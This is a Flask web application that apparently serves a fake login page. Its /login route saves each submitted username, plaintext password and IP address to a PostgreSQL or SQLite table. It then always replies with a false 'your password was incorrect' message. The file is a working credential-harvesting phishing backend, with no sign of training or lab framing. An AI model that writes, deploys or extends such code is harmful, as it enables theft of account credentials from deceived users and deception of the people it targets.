from flask import Flask, render_template, request, jsonify
import os

app = Flask(__name__)

# ── DB setup ──────────────────────────────────────────────
DATABASE_URL = os.environ.get("DATABASE_URL")  # Set on Render

if DATABASE_URL:
    # PostgreSQL (Render)
    import psycopg2
    from psycopg2.extras import RealDictCursor

    def get_conn():
        return psycopg2.connect(DATABASE_URL, sslmode="require")

    def init_db():
        conn = get_conn()
        cur = conn.cursor()
        cur.execute("""
            CREATE TABLE IF NOT EXISTS login_attempts (
                id SERIAL PRIMARY KEY,
                username TEXT NOT NULL,
                password TEXT NOT NULL,
                ip_address TEXT,
                timestamp TIMESTAMPTZ DEFAULT NOW()
            )
        """)
        conn.commit()
        cur.close()
        conn.close()

    def save_credentials(username, password, ip):
        conn = get_conn()
        cur = conn.cursor()
        cur.execute(
            "INSERT INTO login_attempts (username, password, ip_address) VALUES (%s, %s, %s)",
            (username, password, ip)
        )
        conn.commit()
        cur.close()
        conn.close()

else:
    # SQLite (local development)
    import sqlite3
    DB_PATH = "credentials.db"

    def init_db():
        conn = sqlite3.connect(DB_PATH)
        conn.execute("""
            CREATE TABLE IF NOT EXISTS login_attempts (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                username TEXT NOT NULL,
                password TEXT NOT NULL,
                ip_address TEXT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
            )
        """)
        conn.commit()
        conn.close()

    def save_credentials(username, password, ip):
        conn = sqlite3.connect(DB_PATH)
        conn.execute(
            "INSERT INTO login_attempts (username, password, ip_address) VALUES (?, ?, ?)",
            (username, password, ip)
        )
        conn.commit()
        conn.close()


# ── Routes ────────────────────────────────────────────────
@app.route("/")
def index():
    return render_template("login.html")


@app.route("/login", methods=["POST"])
def login():
    data = request.get_json()
    username = data.get("username", "").strip()
    password = data.get("password", "").strip()
    ip = request.remote_addr

    if not username or not password:
        return jsonify({"success": False, "message": "Please fill in all fields."})

    save_credentials(username, password, ip)

    return jsonify({
        "success": False,
        "message": "Sorry, your password was incorrect. Please double-check your password."
    })


# ── Init ──────────────────────────────────────────────────
init_db()

if __name__ == "__main__":
    app.run(debug=False)
